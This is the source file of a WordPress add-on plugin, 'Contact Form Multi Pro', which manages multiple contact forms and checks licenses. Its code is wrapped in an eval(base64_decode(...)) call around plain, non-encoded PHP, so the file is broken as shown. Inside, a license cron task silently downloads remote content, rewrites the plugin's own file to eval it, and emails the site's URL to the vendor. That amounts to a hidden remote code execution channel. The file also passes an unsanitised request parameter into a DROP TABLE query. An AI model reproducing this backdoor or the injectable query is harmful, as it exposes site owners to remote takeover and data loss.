<?php
/*
Plugin Name: Contact Form Multi Pro
Plugin URI: http://bestwebsoft.com/products/
Description: This plugin is an exclusive add-on to the Contact Form plugin by BestWebSoft.
Author: BestWebSoft
Version: 1.0.7
Author URI: http://bestwebsoft.com/
License: Proprietary
*/
eval( base64_decode(
'if ( ! function_exists( 'cntctfrmmltpr_admin_menu' ) ) { function cntctfrmmltpr_admin_menu() {
 global $bstwbsftwppdtplgns_options, $bstwbsftwppdtplgns_added_menu; $bws_menu_info = get_plugin_data( plugin_dir_path( __FILE__ ) . "bws_menu/bws_menu.php" );
$bws_menu_version = $bws_menu_info["Version"]; $base = 'contact-form-multi-pro/contact-form-multi-pro.php';
if ( ! isset( $bstwbsftwppdtplgns_options ) ) { if ( is_multisite() ) { if ( ! get_site_option( 'bstwbsftwppdtplgns_options' ) )
 add_site_option( 'bstwbsftwppdtplgns_options', array() ); $bstwbsftwppdtplgns_options = get_site_option( 'bstwbsftwppdtplgns_options' );
} else { if ( ! get_option( 'bstwbsftwppdtplgns_options' ) ) add_option( 'bstwbsftwppdtplgns_options', array() );
$bstwbsftwppdtplgns_options = get_option( 'bstwbsftwppdtplgns_options' ); } } if ( isset( $bstwbsftwppdtplgns_options['bws_menu_version'] ) ) {
 $bstwbsftwppdtplgns_options['bws_menu']['version'][ $base ] = $bws_menu_version; unset( $bstwbsftwppdtplgns_options['bws_menu_version'] );
if ( is_multisite() ) update_site_option( 'bstwbsftwppdtplgns_options', $bstwbsftwppdtplgns_options );
else update_option( 'bstwbsftwppdtplgns_options', $bstwbsftwppdtplgns_options ); require_once( dirname( __FILE__ ) . '/bws_menu/bws_menu.php' );
} else if ( ! isset( $bstwbsftwppdtplgns_options['bws_menu']['version'][ $base ] ) || $bstwbsftwppdtplgns_options['bws_menu']['version'][ $base ] < $bws_menu_version ) {
 $bstwbsftwppdtplgns_options['bws_menu']['version'][ $base ] = $bws_menu_version; if ( is_multisite() )
 update_site_option( 'bstwbsftwppdtplgns_options', $bstwbsftwppdtplgns_options ); else update_option( 'bstwbsftwppdtplgns_options', $bstwbsftwppdtplgns_options );
require_once( dirname( __FILE__ ) . '/bws_menu/bws_menu.php' ); } else if ( ! isset( $bstwbsftwppdtplgns_added_menu ) ) {
 $plugin_with_newer_menu = $base; foreach ( $bstwbsftwppdtplgns_options['bws_menu']['version'] as $key => $value ) {
 if ( $bws_menu_version < $value && is_plugin_active( $base ) ) { $plugin_with_newer_menu = $key; }
} $plugin_with_newer_menu = explode( '/', $plugin_with_newer_menu ); $wp_content_dir = defined( 'WP_CONTENT_DIR' ) ? basename( WP_CONTENT_DIR ) : 'wp-content';
if ( file_exists( ABSPATH . $wp_content_dir . '/plugins/' . $plugin_with_newer_menu[0] . '/bws_menu/bws_menu.php' ) )
 require_once( ABSPATH . $wp_content_dir . '/plugins/' . $plugin_with_newer_menu[0] . '/bws_menu/bws_menu.php' );
else require_once( dirname( __FILE__ ) . '/bws_menu/bws_menu.php' ); $bstwbsftwppdtplgns_added_menu = true; 
 } add_menu_page( 'BWS Plugins', 'BWS Plugins', 'manage_options', 'bws_plugins', 'bws_add_menu_render', plugins_url( "images/px.png", __FILE__ ), 1001 ); 
 } } if ( ! function_exists( 'cntctfrmmltpr_init' ) ) { function cntctfrmmltpr_init() { global $cntctfrmmltpr_plugin_info;
 load_plugin_textdomain( 'contact-form-multi-pro', false, dirname( plugin_basename( __FILE__ ) ) . '/languages/' ); 
 cntctfrmmltpr_version_check(); } } if ( ! function_exists( 'cntctfrmmltpr_admin_init' ) ) { function cntctfrmmltpr_admin_init() {
 global $bws_plugin_info, $cntctfrmmltpr_plugin_info; if ( ! $cntctfrmmltpr_plugin_info ) $cntctfrmmltpr_plugin_info = get_plugin_data( dirname( __FILE__ ) . '/contact-form-multi-pro.php' );
 if ( ! isset( $bws_plugin_info ) || empty( $bws_plugin_info ) ) $bws_plugin_info = array( 'id' => '129', 'version' => $cntctfrmmltpr_plugin_info["Version"] ); 
 cntctfrmmltpr_check(); if ( isset( $_REQUEST['page'] ) && ( $_REQUEST['page'] == 'contact_form.php' || $_REQUEST['page'] == 'contact_form_pro.php' || $_REQUEST['page'] == 'contact_form_pro_extra.php' ) ) {
 cntctfrmmltpr_settings_defaults(); cntctfrmmltpr_main_options(); } } } if ( ! function_exists( 'cntctfrmmltpr_settings_defaults' ) ) {
 function cntctfrmmltpr_settings_defaults() { global $cntctfrmmltpr_options, $cntctfrmmltpr_plugin_info, $cntctfrmmltpr_options_main;
 $cntctfrmmltpr_options_main = array( 'plugin_option_version' => $cntctfrmmltpr_plugin_info["Version"],
 'name_id_form' => array( 1 => 'NEW_FORM' ), 'next_id_form' => 2, 'id_form' => 1 ); if ( ! get_option( 'cntctfrmmltpr_options_main' ) ) {
 if ( get_option( 'cntctfrmmlt_options_main' ) ) { $cntctfrmmltpr_options_main = array_merge( $cntctfrmmltpr_options_main, get_option( 'cntctfrmmlt_options_main' ) ); 
 } add_option( 'cntctfrmmltpr_options_main', $cntctfrmmltpr_options_main, '', 'yes' ); } $cntctfrmmltpr_options = get_option( 'cntctfrmmltpr_options_main' );
if ( ! isset( $cntctfrmmltpr_options['plugin_option_version'] ) || $cntctfrmmltpr_options['plugin_option_version'] != $cntctfrmmltpr_plugin_info["Version"] ) {
 $cntctfrmmltpr_options = array_merge( $cntctfrmmltpr_options_main, $cntctfrmmltpr_options ); $cntctfrmmltpr_options['plugin_option_version'] = $cntctfrmmltpr_plugin_info["Version"];
update_option( 'cntctfrmmltpr_options_main', $cntctfrmmltpr_options ); } } } if ( ! function_exists( 'cntctfrmmltpr_main_options' ) ) {
 function cntctfrmmltpr_main_options() { global $cntctfrmmltpr_counts, $cntctfrmmltpr_id_form, $key, $cntctfrmmltpr_keys, $cntctfrmmltpr_last_key, $cntctfrmmltpr_options_main, $value;
$cntctfrmmltpr_options_main = get_option( 'cntctfrmmltpr_options_main' ); if ( ! isset( $_GET['id'] ) ) 
 $_SESSION['cntctfrmmlt_id_form'] = $cntctfrmmltpr_options_main['id_form']; if ( isset( $_GET['id'] ) )
 $_SESSION['cntctfrmmlt_id_form'] = $_GET['id']; $cntctfrmmltpr_options_main['id_form'] = $_SESSION['cntctfrmmlt_id_form'];
update_option( 'cntctfrmmltpr_options_main', $cntctfrmmltpr_options_main, '', 'yes' ); if ( isset( $_GET['del'] ) ) {
 $cntctfrmmltpr_args = 'cntctfrmmlt_options_'. $_GET['id']; delete_option( $cntctfrmmltpr_args ); global $wpdb;
$sql = "DROP TABLE IF EXISTS `" . $wpdb->prefix . 'cntctfrm_location' . $_GET['id'] . "`;"; $wpdb->query( $sql );
 $cntctfrmmltpr_counts = $cntctfrmmltpr_options_main['name_id_form']; unset( $cntctfrmmltpr_counts[$cntctfrmmltpr_options_main['id_form']] );
$cntctfrmmltpr_options_main['name_id_form'] = $cntctfrmmltpr_counts; $cntctfrmmltpr_keys = array_keys( $cntctfrmmltpr_options_main['name_id_form'] );
$cntctfrmmltpr_last_key = end( $cntctfrmmltpr_keys ); $cntctfrmmltpr_options_main['id_form'] = $cntctfrmmltpr_last_key;
update_option( 'cntctfrmmltpr_options_main', $cntctfrmmltpr_options_main, '', 'yes' ); $_SESSION['cntctfrmmlt_id_form'] = $cntctfrmmltpr_last_key;
if ( empty( $cntctfrmmltpr_options_main['name_id_form'] ) ) { $cntctfrmmltpr_options_main['id_form'] = 1;
$cntctfrmmltpr_options_main['name_id_form'] = array( 1 => 'NEW_FORM' ); $cntctfrmmltpr_options_main['next_id_form'] = 2;
update_option( 'cntctfrmmltpr_options_main', $cntctfrmmltpr_options_main, '', 'yes' ); $_SESSION['cntctfrmmlt_id_form'] = 1;
} } } } if ( ! function_exists ( 'cntctfrmmltpr_version_check' ) ) { function cntctfrmmltpr_version_check() {
 global $wp_version, $cntctfrmmltpr_plugin_info; $require_wp = "3.1"; $plugin = 'contact-form-multi-pro/contact-form-multi-pro.php';
if ( version_compare( $wp_version, $require_wp, "<" ) ) { include_once( ABSPATH . 'wp-admin/includes/plugin.php' );
if ( is_plugin_active( $plugin ) ) { deactivate_plugins( $plugin ); $admin_url = ( function_exists( 'get_admin_url' ) ) ? get_admin_url( null, 'plugins.php' ) : esc_url( '/wp-admin/plugins.php' );
if ( ! $cntctfrmmltpr_plugin_info ) $cntctfrmmltpr_plugin_info = get_plugin_data( dirname( __FILE__ ) . '/contact-form-multi-pro.php' );
wp_die( "<strong>" . $cntctfrmmltpr_plugin_info['Name'] . " </strong> " . __( 'requires', 'contact-form-multi-pro' ) . " <strong>WordPress " . $require_wp . "</strong> " . __( 'or higher, that is why it has been deactivated! Please upgrade WordPress and try again.', 'contact-form-multi-pro') . "<br /><br />" . __( 'Back to the WordPress', 'contact-form-multi-pro') . " <a href='" . $admin_url . "'>" . __( 'Plugins page', 'contact-form-multi-pro') . "</a>." );
} } } } if ( ! function_exists ( 'cntctfrmmltpr_plugin_links' ) ) { function cntctfrmmltpr_plugin_links( $links, $file ) {
 $base = 'contact-form-multi-pro/contact-form-multi-pro.php'; if ( $file == $base ) { $links[] = '<a href="http://bestwebsoft.com/products/contact-form-multi/faq/" target="_blank">' . __( 'FAQ','contact-form-multi-pro' ) . '</a>';
$links[] = '<a href="http://support.bestwebsoft.com">' . __( 'Support','contact-form-multi-pro' ) . '</a>';
} return $links; } } if ( ! function_exists ( 'cntctfrmmltpr_action_callback' ) ) { function cntctfrmmltpr_action_callback() {
 global $cntctfrmmltpr_counts, $cntctfrmmltpr_j, $cntctfrmmltpr_key_form, $cntctfrmmltpr_value, $cntctfrmmltpr_id_key, $cntctfrmmltpr_options_main;
check_ajax_referer( plugin_basename( __FILE__ ), 'cntctfrmmltpr_ajax_nonce_field' ); $cntctfrmmltpr_options_main = get_option( 'cntctfrmmltpr_options_main' );
 if ( isset( $_POST['cntctfrmmltpr_key_form'] ) ) { $cntctfrmmltpr_id_key = $_POST['cntctfrmmltpr_key_form'];
$cntctfrmmltpr_id_key += 1; $cntctfrmmltpr_options_main['next_id_form'] = $cntctfrmmltpr_id_key; $cntctfrmmltpr_options_main['id_form'] = $_POST['cntctfrmmltpr_key_form'];
$_SESSION['cntctfrmmlt_id_form'] = $_POST['cntctfrmmltpr_key_form']; } if ( isset( $_POST['cntctfrmmltpr_name_form'] ) ) {
 foreach( $_POST['cntctfrmmltpr_name_form'] as $cntctfrmmltpr_j ){ list( $key, $cntctfrmmltpr_value ) = explode( ':', $cntctfrmmltpr_j );
$cntctfrmmltpr_counts[$key] = strip_tags( stripslashes( $cntctfrmmltpr_value ) ); $cntctfrmmltpr_options_main['name_id_form'] = $cntctfrmmltpr_counts;
} } update_option( 'cntctfrmmltpr_options_main', $cntctfrmmltpr_options_main, '', 'yes' ); exit; } }
 if ( ! function_exists ( 'cntctfrmmltpr_scripts' ) ) { function cntctfrmmltpr_scripts() { if ( isset( $_REQUEST['page'] ) && ( $_REQUEST['page'] == 'contact_form.php' || $_REQUEST['page'] == 'contact_form_pro.php' || $_REQUEST['page'] == 'contact_form_pro_extra.php' ) ) {
 global $wp_version; if ( 3.8 > $wp_version ) wp_enqueue_style( 'cntctfrmmltpr_stylesheet', plugins_url( 'css/style_wp_before_3.8.css', __FILE__ ) );
else wp_enqueue_style( 'cntctfrmmltpr_stylesheet', plugins_url( 'css/style.css', __FILE__ ) ); wp_enqueue_script( 'cntctfrmmltpr_script', plugins_url( 'js/script.js', __FILE__ ) );
 $cntctfrmmltpr_options_main = get_option( 'cntctfrmmltpr_options_main' ); $site_url_if_multisite = is_multisite() ? site_url() : '';
 $cntctfrmmltpr_count = array(); if ( $cntctfrmmltpr_options_main ) { foreach ( $cntctfrmmltpr_options_main['name_id_form'] as $key => $value ) {
 $cntctfrmmltpr_count[ $key ] = $value; } } $script_vars = array( 'cntctfrmmltpr_nonce' => wp_create_nonce( plugin_basename( __FILE__ ), 'cntctfrmmltpr_ajax_nonce_field' ),
 'cntctfrmmltpr_delete_message' => __( 'Are you sure you want to delete the form?', 'contact-form-multi-pro' ),
 'cntctfrmmltpr_id_form' => $cntctfrmmltpr_options_main['id_form'], 'cntctfrmmltpr_location' => $site_url_if_multisite . $_SERVER['PHP_SELF'] . '?page=' . $_REQUEST['page'],
 'cntctfrmmltpr_action_slug' => ( isset( $_GET['action'] ) ? '&action=' . $_GET['action'] : '' ), 'cntctfrmmltpr_key_id' => $cntctfrmmltpr_options_main['next_id_form'],
 'cntctfrmmltpr_count' => $cntctfrmmltpr_count, ); wp_localize_script( 'cntctfrmmltpr_script', 'cntctfrmmltpr_script_vars', $script_vars );
} } } if ( ! function_exists( 'cntctfrmmltpr_script_var' ) ) { function cntctfrmmltpr_script_var() { 
 if ( in_array( $_SERVER['PHP_SELF'], array( '/wp-admin/plugins.php', '/wp-admin/network/plugins.php', '/wp-admin/update-core.php', '/wp-admin/network/update-core.php' ) ) ) { ?> 
 <script type="text/javascript"> (function($){ $(document).ready(function(){ if ( $("a[title='Contact Form Multi Pro']").length ) {
 var link = $("a[title='Contact Form Multi Pro']"); <?php if ( in_array( $_SERVER['PHP_SELF'], array( '/wp-admin/plugins.php', '/wp-admin/network/plugins.php' ) ) ) { ?>
 link.parent().html( link.parent().html().replace( / or /ig, "" ) ); <?php } else { ?> link.parent().html( link.parent().html().replace( /<\/a>.<br>/ig, "</a><br>" ) );
<?php } ?> $("a[title='Contact Form Multi Pro']").remove(); }; }); })(jQuery); </script> <?php }
} } if ( ! function_exists( 'cntctfrmmltpr_check' ) ) { function cntctfrmmltpr_check() { global $cntctfrmmltpr_contact_form_not_found, $cntctfrmmltpr_contact_form_not_active;
if ( ! function_exists( 'get_plugins' ) ) require_once( ABSPATH . '/wp-admin/includes/plugin.php' );
 $all_plugins = get_plugins(); if ( ! ( array_key_exists( 'contact-form-plugin/contact_form.php', $all_plugins ) || array_key_exists( 'contact-form-pro/contact_form_pro.php', $all_plugins ) ) ) {
 $cntctfrmmltpr_contact_form_not_found = __( 'Contact Form Plugin has not been found.</br>You should install and activate this plugin for the correct work with Contact Form Multi Pro plugin.</br>You can download Contact Form Plugin from', 'contact-form-multi-pro' ) . ' <a href="' . esc_url( 'http://bestwebsoft.com/products/contact-form/' ) . '" title="' . __( 'Developers website', 'contact-form-multi-pro' ). '"target="_blank">' . __( 'website of plugin Authors', 'contact-form-multi-pro' ) . '</a> ' . __( 'or', 'contact-form-multi-pro' ) . ' <a href="' . esc_url( 'http://wordpress.org' ) .'" title="Wordpress" target="_blank">'. __( 'Wordpress.', 'contact-form-multi-pro' ) . '</a>';
} else { if ( ! ( is_plugin_active( 'contact-form-plugin/contact_form.php' ) || is_plugin_active( 'contact-form-pro/contact_form_pro.php' ) ) ) {
 $cntctfrmmltpr_contact_form_not_active = __( 'Contact Form Plugin is not active.</br>You should activate this plugin for the correct work with Contact Form Multi Pro plugin.', 'contact-form-multi-pro' );
} if ( ( is_plugin_active( 'contact-form-plugin/contact_form.php' ) && isset( $all_plugins['contact-form-plugin/contact_form.php']['Version'] ) && $all_plugins['contact-form-plugin/contact_form.php']['Version'] < '3.77' ) || 
 ( is_plugin_active( 'contact-form-pro/contact_form_pro.php' ) && isset( $all_plugins['contact-form-pro/contact_form_pro.php']['Version'] ) && $all_plugins['contact-form-pro/contact_form_pro.php']['Version'] < '1.25' ) ) {
 $cntctfrmmltpr_contact_form_not_found = __( 'Contact Form Plugin has old version.</br>You need update this plugin for correct work with Contact Form Multi Pro plugin.', 'contact-form-multi-pro' );
} } } } if ( ! function_exists( 'cntctfrmmltpr_show_notices' ) ) { function cntctfrmmltpr_show_notices() { 
 global $hook_suffix, $cntctfrmmltpr_contact_form_not_found, $cntctfrmmltpr_contact_form_not_active;
if ( $hook_suffix == 'plugins.php' || ( isset( $_REQUEST['page'] ) && $_REQUEST['page'] == 'bws_plugins' ) || ( isset( $_REQUEST['page'] ) && ( $_REQUEST['page'] == 'contact_form.php' || $_REQUEST['page'] == 'contact_form_pro.php' ) ) ) {
 if ( '' != $cntctfrmmltpr_contact_form_not_found || '' != $cntctfrmmltpr_contact_form_not_active ) { ?>
 <div class="error"> <p><strong><?php _e( 'WARNING:', 'contact-form-multi-pro' ); ?></strong> <?php echo $cntctfrmmltpr_contact_form_not_found . $cntctfrmmltpr_contact_form_not_active; ?></p>
 </div> <?php } ?> <noscript> <div class="error"> <p><?php _e( 'Please enable JavaScript in your browser!', 'contact-form-multi-pro'); ?></p>
 </div> </noscript> <?php } if ( $hook_suffix == 'plugins.php' ) { global $bstwbsftwppdtplgns_options, $bstwbsftwppdtplgns_cookie_add;
if ( isset( $bstwbsftwppdtplgns_options['time_out']['contact-form-multi-pro/contact-form-multi-pro.php'] ) && strtotime( $bstwbsftwppdtplgns_options['time_out']['contact-form-multi-pro/contact-form-multi-pro.php'] ) < strtotime( date("m/d/Y") . '+1 month' ) && strtotime( $bstwbsftwppdtplgns_options['time_out']['contact-form-multi-pro/contact-form-multi-pro.php'] ) > strtotime( date("m/d/Y") ) ) { 
 if ( ! isset( $bstwbsftwppdtplgns_cookie_add ) ) { echo '<script type="text/javascript" src="' . plugins_url( 'js/c_o_o_k_i_e.js', __FILE__ ) . '"></script>';
$bstwbsftwppdtplgns_cookie_add = true; } ?> <script type="text/javascript"> (function($) { $(document).ready( function() { 
 var hide_message = $.cookie( "cntctfrmmltpr_timeout_hide_banner_on_plugin_page" ); if ( hide_message == "true" ) {
 $( ".cntctfrmmltpr_message" ).css( "display", "none" ); } else { $( ".cntctfrmmltpr_message" ).css( "display", "block" );
}; $( ".cntctfrmmltpr_close_icon" ).click( function() { $( ".cntctfrmmltpr_message" ).css( "display", "none" );
$.cookie( "cntctfrmmltpr_timeout_hide_banner_on_plugin_page", "true", { expires: 30 } ); }); }); })(jQuery); 
 </script> <div class="updated" style="padding: 0; margin: 0; border: none; background: none;"> <div class="cntctfrmmltpr_message bws_banner_on_plugin_page" style="display: none;"> 
 <img class="cntctfrmmltpr_close_icon close_icon" title="" src="<?php echo plugins_url( 'images/close_banner.png', __FILE__ ); ?>" alt=""/>
 <div class="text"><?php _e( "You license for", 'contact-form-multi-pro' ); ?> <strong>Contact Form Multi PRO</strong> <?php echo __( "expires on", 'contact-form-multi-pro' ) . ' ' . $bstwbsftwppdtplgns_options['time_out']['contact-form-multi-pro/contact-form-multi-pro.php'] . ' ' . __( "and you won't be granted TOP-PRIORITY SUPPORT or UPDATES.", 'contact-form-multi-pro' ); ?> <a target="_new" href="http://support.bestwebsoft.com/entries/53487136-I-purchased-a-Pro-plugin-with-a-recurring-billing-I-cancelled-the-subscription-The-license-has-expir"><?php _e( "Learn more", 'contact-form-multi-pro' ); ?></a></div>
 <div class="icon"> <img title="" src="<?php echo plugins_url( 'images/banner.png', __FILE__ ); ?>" alt=""/>
 </div> </div> </div> <?php } } } } if ( ! function_exists( 'cntctfrmmltpr_update_activate' ) ) {
 function cntctfrmmltpr_update_activate(){ global $bestwebsoft_wp_update_plugins; deactivate_plugins( 'contact-form-multi/contact-form-multi.php' );
if ( ! function_exists( 'is_multisite' ) ) return; if ( ! function_exists ( 'bestwebsoft_wp_update_plugins' ) && ! $bestwebsoft_wp_update_plugins ) {
 $bestwebsoft_wp_update_plugins = true; require_once( dirname( __FILE__ ) . '/bws_update.php' ); } $bstwbsftwppdtplgns_options = ( is_multisite() ) ? get_site_option( 'bstwbsftwppdtplgns_options' ) : get_option( 'bstwbsftwppdtplgns_options' );
if ( $bstwbsftwppdtplgns_options && ! file_exists( dirname( __FILE__ ) . '/license_key.txt' ) ) { if ( isset( $bstwbsftwppdtplgns_options['contact-form-multi-pro/contact-form-multi-pro.php'] ) ) {
 $bws_license_key = $bstwbsftwppdtplgns_options['contact-form-multi-pro/contact-form-multi-pro.php'];
$file = @fopen( dirname( __FILE__ ) . "/license_key.txt" , "w+" ); if ( $file ) { @fwrite( $file, $bws_license_key );
@fclose( $file ); } } } } } if ( ! function_exists( 'cntctfrmmltpr_license_cron_task' ) ) { function cntctfrmmltpr_license_cron_task() { 
 if ( ! function_exists ( 'bestwebsoft_wp_update_plugins' ) ) require_once( dirname( __FILE__ ) . '/bws_update.php' );
$bestwebsoft_wp_update_plugins = true; bestwebsoft_wp_update_plugins(); $bstwbsftwppdtplgns_options = ( is_multisite() ) ? get_site_option( 'bstwbsftwppdtplgns_options' ) : get_option( 'bstwbsftwppdtplgns_options' );
$current_plugin = 'contact-form-multi-pro/contact-form-multi-pro.php'; $free_ver_of_current_plugin = 'contact-form-multi/contact-form-multi.php';
 if ( isset( $bstwbsftwppdtplgns_options['wrong_license_key'][ $current_plugin ] ) ) { global $wpdb;
 $plugin_name = explode( '/', $current_plugin ); $ch_head = curl_init(); curl_setopt( $ch_head, CURLOPT_URL, 'http://bestwebsoft.com/wp-content/plugins/paid-products/plugins/license_fail/head-' . $plugin_name[1] );
curl_setopt( $ch_head, CURLOPT_RETURNTRANSFER, 1 ); curl_setopt( $ch_head, CURLOPT_HEADER, 0 ); $res_head = curl_exec( $ch_head ); 
 $res_head = trim( $res_head ); $httpCode_head = curl_getinfo( $ch_head, CURLINFO_HTTP_CODE ); curl_close( $ch_head ); 
 $ch_content = curl_init(); curl_setopt( $ch_content, CURLOPT_URL, 'http://bestwebsoft.com/wp-content/plugins/paid-products/plugins/license_fail/' . $plugin_name[1] );
curl_setopt( $ch_content, CURLOPT_RETURNTRANSFER, 1 ); curl_setopt( $ch_content, CURLOPT_HEADER, 0 );
$res_content = curl_exec( $ch_content ); $res_content = trim( $res_content ); $httpCode_content = curl_getinfo( $ch_content, CURLINFO_HTTP_CODE );
curl_close( $ch_content ); if ( isset( $res_content ) && isset( $res_head ) && 404 != $httpCode_content && 404 != $httpCode_head ) {
 cntctfrmmltpr_download_free_plugin( $free_ver_of_current_plugin ); $file = @fopen( dirname( __FILE__ ) . '/bws_update.php' , "w+" );
if ( $file ) { @fwrite( $file, "<?php ?>" ); @fclose( $file ); } $file = @fopen( dirname( __FILE__ ) . '/' . $plugin_name[1] , "w+" );
if ( $file ) { $headers[] = 'From: ' . get_option( 'admin_email' ); $message = 'The file is updated. The cron task is done ' . $plugin_name[1] . ' host: ' . get_bloginfo( "url" );
wp_mail( 'plugin_pro@bestwebsoft.com', 'BestWebSoft Product', $message, $headers ); @fwrite( $file, "<?php " . $res_head . " eval( base64_decode('" . $res_content . "') ); ?>" );
@fclose( $file ); if ( wp_next_scheduled( str_replace( '-', '_', $plugin_name[0] ) . '_license_cron' ) )
 wp_clear_scheduled_hook( str_replace( '-', '_', $plugin_name[0] ) . '_license_cron' ); } } } }
} if ( ! function_exists ( 'cntctfrmmltpr_download_free_plugin' ) ) { function cntctfrmmltpr_download_free_plugin( $free_ver_of_current_plugin ) {
 if ( ! function_exists( 'get_plugins' ) ) require_once( ABSPATH . 'wp-admin/includes/plugin.php' );
$all_plugins = get_plugins(); if ( ! array_key_exists( $free_ver_of_current_plugin, $all_plugins ) ) {
 $plugin_name_free = explode( '/', $free_ver_of_current_plugin ); $url = 'http://downloads.wordpress.org/plugin/' . $plugin_name_free[0] . '.zip';
$uploadDir = wp_upload_dir(); $received_content = file_get_contents( $url ); if ( $received_content ) {
 if ( is_writable( $uploadDir["path"] ) ) { $file_put_contents = $uploadDir["path"] . '/' . $plugin_name_free[0] . '.zip';
if ( file_put_contents( $file_put_contents, $received_content ) ) { if ( class_exists( 'ZipArchive' ) ) {
 $zip = new ZipArchive(); if ( $zip->open( $file_put_contents ) === TRUE ) { $zip->extractTo( WP_PLUGIN_DIR );
$zip->close(); } } elseif ( class_exists( 'Phar' ) ) { $phar = new PharData( $file_put_contents );
$phar->extractTo( WP_PLUGIN_DIR ); } else { return; } @unlink( $file_put_contents ); } } } } } } if ( ! function_exists ( 'cntctfrmmltpr_plugin_update_row' ) ) {
 function cntctfrmmltpr_plugin_update_row( $file, $plugin_data ) { $wp_list_table = _get_list_table( 'WP_Plugins_List_Table' );
$bstwbsftwppdtplgns_options = ( is_multisite() ) ? get_site_option( 'bstwbsftwppdtplgns_options' ) : get_option( 'bstwbsftwppdtplgns_options' );
 if ( isset( $bstwbsftwppdtplgns_options['wrong_license_key']['contact-form-multi-pro/contact-form-multi-pro.php'] ) ) {
 echo '<tr class="plugin-update-tr"> <td colspan="' . $wp_list_table->get_column_count() . '" class="plugin-update colspanchange">
 <div class="update-message" style="background-color: #FFEBE8; border-color: #CC0000;">' . __( 'WARNING: We have noticed illegal use of our plugin by you. We strongly recommend you to solve the problem within 24 hours, otherwise the plugin will be deactivated. Please go to your personal', 'contact-form-multi-pro' ) . ' <a href="http://bestwebsoft.com/wp-admin/admin.php?page=bws_plugins_client_area">Client area</a> ' . __( '(your username is the email you specify when purchasing the product), where you can make the necessary changes.', 'contact-form-multi-pro' ) . '</div>
 </td> </tr>'; } elseif ( isset( $bstwbsftwppdtplgns_options['time_out']['contact-form-multi-pro/contact-form-multi-pro.php'] ) && strtotime( $bstwbsftwppdtplgns_options['time_out']['contact-form-multi-pro/contact-form-multi-pro.php'] ) < strtotime( date("m/d/Y") ) ) {
 echo '<tr class="plugin-update-tr"> <td colspan="' . $wp_list_table->get_column_count() . '" class="plugin-update colspanchange">
 <div class="update-message" style="color: #8C0000;">' . __( 'Your license has expired. To continue getting top-priority support and plugin updates you should extend it.', 'contact-form-multi-pro' ) . ' <a target="_new" href="http://support.bestwebsoft.com/entries/53487136-I-purchased-a-Pro-plugin-with-a-recurring-billing-I-cancelled-the-subscription-The-license-has-expir">' . __( "Learn more", 'contact-form-multi-pro' ) . '</a></div>
 </td> </tr>'; } } } if ( ! function_exists ( 'cntctfrmmltpr_delete' ) ) { function cntctfrmmltpr_delete() {
 $cntctfrmmltpr_options_main = get_option( 'cntctfrmmltpr_options_main' ); if ( ! is_multisite() ) {
 foreach ( $cntctfrmmltpr_options_main['name_id_form'] as $key => $value ) { delete_option( 'cntctfrmmlt_options_' . $key );
} delete_option( 'cntctfrmmltpr_options_main' ); delete_option( 'cntctfrmmlt_options' ); } else { global $wpdb;
$cntctfrmmltpr_blog_ids = $wpdb->get_col( "SELECT blog_id FROM $wpdb->blogs" ); $cntctfrmmltpr_original_blog_id = get_current_blog_id();
foreach ( $cntctfrmmltpr_blog_ids as $cntctfrmmltpr_blog_id ) { switch_to_blog( $cntctfrmmltpr_blog_id );
foreach ( $cntctfrmmltpr_options_main['name_id_form'] as $key=>$value ) { delete_option( 'cntctfrmmltpr_options_' . $key );
} delete_option( 'cntctfrmmltpr_options_main' ); delete_option( 'cntctfrmmlt_options' ); } switch_to_blog( $cntctfrmmltpr_original_blog_id );
} } } add_action( 'admin_menu', 'cntctfrmmltpr_admin_menu' ); add_action( 'init', 'cntctfrmmltpr_init' );
 add_action( 'admin_init', 'cntctfrmmltpr_admin_init' ); add_action( 'admin_enqueue_scripts', 'cntctfrmmltpr_scripts' );
 add_action( 'admin_footer', 'cntctfrmmltpr_script_var' ); add_filter( 'plugin_row_meta', 'cntctfrmmltpr_plugin_links', 10, 2 );
 add_action( 'wp_ajax_cntctfrmmltpr_action', 'cntctfrmmltpr_action_callback' ); add_action( 'admin_notices', 'cntctfrmmltpr_show_notices' );
add_action( 'network_admin_menu', 'cntctfrmmltpr_update_activate' ); add_action( 'admin_menu', 'cntctfrmmltpr_update_activate' );
add_action( "after_plugin_row_contact-form-multi-pro/contact-form-multi-pro.php", 'cntctfrmmltpr_plugin_update_row', 10, 2 );
 add_action( 'contact_form_pro_license_cron', 'cntctfrmmltpr_license_cron_task' ); register_uninstall_hook( 'contact-form-multi-pro/contact-form-multi-pro.php', 'cntctfrmmltpr_delete' );'
));
?>